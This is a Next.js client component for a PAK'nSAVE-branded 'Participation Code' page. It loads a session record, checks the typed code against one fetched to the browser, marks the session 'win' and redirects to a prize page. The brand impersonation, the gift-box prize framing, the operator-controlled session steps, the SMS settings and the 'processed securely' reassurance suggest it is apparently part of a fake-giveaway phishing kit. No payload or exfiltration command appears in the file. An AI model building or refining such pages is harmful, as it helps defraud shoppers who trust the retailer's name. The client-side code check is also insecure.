"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { ConfigMissing } from "@/components/demo/ConfigMissing";
import { useSettings } from "@/contexts/SettingsContext";
import {
  getPreferredRouteSessionId,
  persistActiveSession,
} from "@/lib/session-id-client";

export function CodeEntryClient({
  sessionId,
  routeSessionId,
}: {
  sessionId: string;
  routeSessionId?: string;
}) {
  const router = useRouter();
  const supabase = createBrowserSupabaseClient();
  const { settings, loading: settingsLoading } = useSettings();
  const effectiveRouteSessionId = getPreferredRouteSessionId(sessionId, routeSessionId);
  const [partnerName, setPartnerName] = useState<string>("");
  const [expectedCode, setExpectedCode] = useState<string>("");
  const [enteredCode, setEnteredCode] = useState("");
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [processing, setProcessing] = useState(false);

  useEffect(() => {
    let cancelled = false;
    void (async () => {
      if (supabase === null) {
        setLoading(false);
        return;
      }
      const { data, error: qErr } = await supabase
        .from("sessions")
        .select("partner_name, participation_code, form_data")
        .eq("id", sessionId)
        .maybeSingle();

      if (cancelled) return;
      if (qErr || !data) {
        setError("Session not found or configuration is invalid.");
        setLoading(false);
        return;
      }

      const formData = data.form_data as Record<string, any>;
      setPartnerName(formData?.partner_display_name || data.partner_name || "partner");
      setExpectedCode(data.participation_code || "");
      setLoading(false);
    })();
    return () => {
      cancelled = true;
    };
  }, [sessionId, supabase]);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (!supabase) return;
    setError(null);

    const cleanCode = enteredCode.trim().toLowerCase();
    const expectedCodeClean = expectedCode.trim().toLowerCase();
    if (!cleanCode) {
      setError("Enter your participation code.");
      return;
    }

    if (expectedCodeClean && cleanCode !== expectedCodeClean) {
      setError("The code you entered is invalid.");
      return;
    }

    setProcessing(true);

    const { error: upErr } = await supabase
      .from("sessions")
      .update({ is_hidden: false, current_step: "win" })
      .eq("id", sessionId);

    if (upErr) {
      setError("Saving failed. Please try again.");
      setProcessing(false);
      return;
    }

    persistActiveSession(sessionId, effectiveRouteSessionId);

    window.setTimeout(() => {
      setProcessing(false);
      router.push(`/win/${encodeURIComponent(effectiveRouteSessionId)}`);
    }, 500);
  }


  if (settingsLoading) {
    return (
      <div className="flex min-h-[100dvh] items-center justify-center">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[#0066CC]/30 border-t-[#0066CC]" />
        </div>
      </div>
    );
  }

  if (!supabase) {
    return (
      <div className="pak-page-shell">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8">
          <ConfigMissing />
        </div>
      </div>
    );
  }

  if (loading) {
    return (
      <div className="pak-page-shell">
        <div className="w-full max-w-[650px] rounded-[24px] bg-[#020b22] border border-[#0066CC] shadow-[0_0_40px_rgba(0,102,204,0.3)] p-5 sm:p-8 flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-[#0066CC] border-t-transparent" />
        </div>
      </div>
    );
  }

  return (
    <div className="pak-page-shell">
      <div className="pak-form-card fade-in relative z-10 w-full max-w-[820px]">
        <div className="pak-form-inner px-6 pb-8 pt-8 sm:px-10 sm:pb-10 sm:pt-10">
          <div className="grid gap-7 lg:grid-cols-[minmax(0,1fr)_220px] lg:items-start">
            <div className="min-w-0">
              <div className="max-w-[34rem]">
                <h2 className="pak-form-title">{settings.code_title}</h2>
                <p className="pak-form-subtitle mt-3 whitespace-pre-line">
                  {settings.code_subtitle.split("{partner}").map((part, i, arr) => (
                    <span key={i}>
                      {part}
                      {i < arr.length - 1 && <strong className="font-bold text-[#ffe876]">{partnerName}</strong>}
                    </span>
                  ))}
                </p>
              </div>
            </div>

            <div className="flex items-start justify-between gap-4 lg:block">
              <img
                src="/form-assets/paknsave-logo-form.png"
                alt="PAK'nSAVE"
                className="h-14 w-14 object-contain sm:h-16 sm:w-16 lg:ml-auto lg:mb-4"
                id="code-brand-logo"
              />
              <img
                src="/form-assets/paknsave-gift-box.png"
                alt=""
                className="h-auto w-24 object-contain drop-shadow-[0_18px_32px_rgba(0,0,0,0.45)] sm:w-32 lg:w-full lg:max-w-[200px] lg:translate-x-2"
              />
            </div>
          </div>

          {error && (
            <div className="mt-7 rounded-2xl border border-red-500/25 bg-red-500/10 p-4 text-center text-sm font-bold text-red-300">
              {error}
            </div>
          )}

          <form onSubmit={handleSubmit} className="mt-7 space-y-6">
            <div className="pak-form-label">
              <label className="mb-3 block text-left">Participation Code</label>
              <div className="pak-form-input-wrap">
                <div className="pak-form-input-icon">
                  <svg className="h-6 w-6" fill="none" stroke="currentColor" viewBox="0 0 24 24" aria-hidden="true" strokeWidth="2">
                    <path strokeLinecap="round" strokeLinejoin="round" d="M16 5H8a3 3 0 0 0-3 3v1a2 2 0 0 1 0 4v1a3 3 0 0 0 3 3h8a3 3 0 0 0 3-3v-1a2 2 0 0 1 0-4V8a3 3 0 0 0-3-3z" />
                    <path strokeLinecap="round" strokeLinejoin="round" d="M12 8v8" />
                  </svg>
                </div>
                <input
                  type="text"
                  required
                  className="pak-form-input min-h-[4.75rem] pl-14 pr-4 text-center text-[1.7rem] font-black tracking-[0.28em] uppercase"
                  value={enteredCode}
                  onChange={(e) => setEnteredCode(e.target.value)}
                  placeholder=""
                  autoComplete="off"
                />
              </div>
            </div>

            <div className="flex flex-col gap-4 pt-1 md:flex-row md:items-center md:justify-between">
              <div className="pak-form-security">
                <svg className="h-9 w-9 shrink-0 text-[#ffd500]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.9">
                  <path d="M12 3.7 18.4 6v5.2c0 4-2.3 7.1-6.4 9.1-4.1-2-6.4-5.1-6.4-9.1V6L12 3.7Z" strokeLinejoin="round" />
                </svg>
                <span>Your information is processed securely.</span>
              </div>

              <button
                type="submit"
                disabled={processing}
                className="pak-form-button min-h-[4.25rem] w-full px-6 text-xl md:w-[24rem]"
              >
                {processing ? settings.sms_loading : settings.code_button}
              </button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
}
